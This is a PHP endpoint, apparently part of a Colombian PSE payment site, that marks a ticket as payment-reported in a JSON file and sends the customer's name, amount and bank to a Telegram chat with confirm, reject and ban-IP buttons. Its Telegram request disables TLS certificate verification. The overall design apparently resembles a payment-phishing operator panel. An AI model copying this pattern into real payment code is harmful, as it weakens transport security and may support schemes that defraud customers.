<?php
header('Content-Type: application/json; charset=utf-8');

// Seguridad: bloquear IPs baneadas + rate limit
require_once __DIR__ . '/../includes/security.php';
sura_enforce_security(['rate_limit' => true, 'rate_limit_max' => 20, 'rate_limit_window' => 60]);

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'message' => 'Método no permitido']);
    exit;
}

$input  = json_decode(file_get_contents('php://input'), true) ?: [];
$ticket = preg_replace('/[^A-Za-z0-9-]/', '', $input['ticketId'] ?? '');

if (!$ticket) {
    echo json_encode(['ok' => false, 'message' => 'Ticket inválido']);
    exit;
}

$logsFile = __DIR__ . '/../transacciones_pse.json';
$logs = file_exists($logsFile) ? (json_decode(file_get_contents($logsFile), true) ?: []) : [];

$found = false;
foreach ($logs as $i => $l) {
    if (($l['ticketId'] ?? '') === $ticket) {
        $found = true;
        if (($l['status'] ?? '') === 'COMPROBANTE_REPORTADO') {
            echo json_encode(['ok' => true, 'message' => 'Ya estaba confirmado', 'ticketId' => $ticket]);
            exit;
        }
        $logs[$i]['status'] = 'COMPROBANTE_REPORTADO';
        $logs[$i]['confirmado_at'] = date('c');
        $tx = $logs[$i];
        break;
    }
}

if (!$found) {
    echo json_encode(['ok' => false, 'message' => 'Transacción no encontrada']);
    exit;
}

file_put_contents($logsFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// Notificar a Telegram
require_once __DIR__ . '/../includes/app-config.php';
$botToken = app_cfg('telegram.bot_token', '');
$chatId   = app_cfg('telegram.chat_id_genericos', '');

if ($botToken && $chatId) {
    $texto = "💰 <b>Pago reportado por el cliente</b>\n" .
        "🎫 " . $ticket . "\n" .
        "👤 " . ($tx['nombres'] ?? '-') . "\n" .
        "💵 $" . number_format($tx['monto'] ?? 0, 0, ',', '.') . " COP\n" .
        "🏦 " . ($tx['banco'] ?? '-') . "\n" .
        "📊 Estado: ✅ COMPROBANTE REPORTADO";
    $keyboard = [
        [
            ['text' => '✅ Confirmar pago', 'callback_data' => 'pay_ok:' . $ticket],
            ['text' => '❌ Rechazar', 'callback_data' => 'pay_no:' . $ticket]
        ],
        [
            ['text' => '🚫 Ban IP', 'callback_data' => 'ban_ip:' . $ticket]
        ]
    ];
    $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode([
            'chat_id' => $chatId,
            'text' => $texto,
            'parse_mode' => 'HTML',
            'reply_markup' => ['inline_keyboard' => $keyboard]
        ]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    curl_exec($ch);
    curl_close($ch);
}

echo json_encode(['ok' => true, 'message' => 'Pago reportado correctamente', 'ticketId' => $ticket]);
